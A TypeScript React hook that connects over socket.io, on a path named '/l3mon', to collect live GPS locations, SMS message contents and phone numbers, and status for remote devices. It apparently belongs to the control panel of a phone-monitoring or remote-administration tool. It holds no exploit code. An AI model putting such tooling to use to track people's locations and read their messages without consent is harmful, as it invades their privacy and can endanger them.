import { useEffect, useState, useCallback, useRef } from "react";
import { io, Socket } from "socket.io-client";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

// Completely reset all state
function resetState() {
  console.log("[WS] Resetting all WebSocket state");
  deviceStores.clear();
  listeners.clear();
  currentVersion++;
  activeDeviceIds.clear();
}

interface DeviceStore {
  location: DeviceLocation | null;
  sms: SMSMessage[];
  status: DeviceStatus | null;
}

// Singleton state
let globalSocket: Socket | null = null;
let socketInitialized = false;
const deviceStores: Map<number, DeviceStore> = new Map();
let listeners: Set<() => void> = new Set();
let currentVersion = 0;
let activeDeviceIds: Set<number> = new Set();

function getStore(deviceId: number): DeviceStore {
  let store = deviceStores.get(deviceId);
  if (!store) {
    store = { location: null, sms: [], status: null };
    deviceStores.set(deviceId, store);
  }
  return store;
}

function notifyAll() {
  currentVersion++;
  listeners.forEach(fn => fn());
}

function attachListeners() {
  if (!globalSocket || socketInitialized) return;
  socketInitialized = true;

  globalSocket.on("connect", () => { 
    console.log("[WS] Connected"); 
    notifyAll(); 
  });
  
  globalSocket.on("disconnect", () => { 
    console.log("[WS] Disconnected"); 
    notifyAll(); 
  });

  globalSocket.on("location-update", (loc: DeviceLocation) => {
    console.log("[WS] Location:", loc.deviceId);
    const store = getStore(loc.deviceId);
    store.location = loc;
    activeDeviceIds.add(loc.deviceId);
    notifyAll();
  });

  globalSocket.on("location:update", (loc: DeviceLocation) => {
    console.log("[WS] Location (v2):", loc.deviceId);
    const store = getStore(loc.deviceId);
    store.location = loc;
    activeDeviceIds.add(loc.deviceId);
    notifyAll();
  });

  globalSocket.on("sms-received", (sms: SMSMessage) => {
    console.log("[WS] SMS:", sms.deviceId);
    const store = getStore(sms.deviceId);
    const exists = store.sms.some(s => s.timestamp === sms.timestamp && s.message === sms.message);
    if (!exists) {
      store.sms = [sms, ...store.sms].slice(0, 100);
      activeDeviceIds.add(sms.deviceId);
      notifyAll();
    }
  });

  globalSocket.on("sms-batch", (msgs: SMSMessage[]) => {
    console.log("[WS] SMS batch:", msgs.length);
    if (msgs.length > 0) {
      const store = getStore(msgs[0].deviceId);
      store.sms = msgs.slice(0, 100);
      activeDeviceIds.add(msgs[0].deviceId);
      notifyAll();
    }
  });

  globalSocket.on("status-update", (status: DeviceStatus) => {
    const store = getStore(status.deviceId);
    store.status = status;
    activeDeviceIds.add(status.deviceId);
    notifyAll();
  });
}

export function useWebSocket() {
  const [, setVersion] = useState(0);
  const initialized = useRef(false);

  useEffect(() => {
    if (!initialized.current) {
      initialized.current = true;
      resetState();
      
      globalSocket = io(window.location.origin, {
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        transports: ["websocket", "polling"],
        path: "/l3mon",
      });

      attachListeners();
    }

    const listener = () => setVersion(v => v + 1);
    listeners.add(listener);

    return () => {
      listeners.delete(listener);
    };
  }, []);

  const syncDevices = useCallback((activeIds: number[]) => {
    const activeSet = new Set(activeIds);
    console.log(`[WS] Sync: ${activeIds.length} active devices`);
    
    for (const id of deviceStores.keys()) {
      if (!activeSet.has(id)) {
        console.log(`[WS] Removing data for device ${id}`);
        deviceStores.delete(id);
      }
    }
    
    notifyAll();
  }, []);

  const clearDevice = useCallback((deviceId: number) => {
    console.log(`[WS] Clearing device ${deviceId}`);
    deviceStores.delete(deviceId);
    notifyAll();
  }, []);

  const clearAll = useCallback(() => {
    console.log(`[WS] Clearing ALL data`);
    deviceStores.clear();
    activeDeviceIds.clear();
    notifyAll();
  }, []);

  const joinDevice = useCallback((deviceId: number) => {
    getStore(deviceId);
    activeDeviceIds.add(deviceId);
    globalSocket?.emit("join-device", deviceId);
  }, []);

  const leaveDevice = useCallback((deviceId: number) => {
    globalSocket?.emit("leave-device", deviceId);
  }, []);

  const getLocation = useCallback((deviceId: number): DeviceLocation | undefined => {
    void currentVersion;
    return getStore(deviceId).location || undefined;
  }, []);

  const getSms = useCallback((deviceId: number): SMSMessage[] => {
    void currentVersion;
    return getStore(deviceId).sms;
  }, []);

  const getStatus = useCallback((deviceId: number): DeviceStatus | undefined => {
    void currentVersion;
    return getStore(deviceId).status || undefined;
  }, []);

  return {
    isConnected: globalSocket?.connected || false,
    joinDevice,
    leaveDevice,
    syncDevices,
    clearDevice,
    clearAll,
    getLocation,
    getSms,
    getStatus,
  };
}
